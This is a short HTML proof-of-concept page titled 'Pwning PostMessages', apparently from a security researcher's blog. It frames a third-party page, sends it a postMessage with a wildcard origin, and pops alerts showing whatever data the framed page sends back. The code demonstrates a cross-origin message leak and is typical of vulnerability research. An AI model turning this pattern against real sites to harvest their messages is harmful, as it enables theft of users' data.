<body>
    <h2> Pwning PostMessages </h2>
    <iframe src="https://blog.0xrudrapratap.ninja/poc/1.html" id="test"> </iframe>
    <script>
        window.addEventListener("message", receiveMessage, false);
        var wn = document.getElementsByTagName("iframe")[0].contentWindow;
        wn.postMessage("testing","*");
        
        function receiveMessage(event) {
        for (key in event.data){
            alert("key: " + key + " value :" + Object.keys(event.data[key]).join(' '));
            }
        }
    </script>
</body>
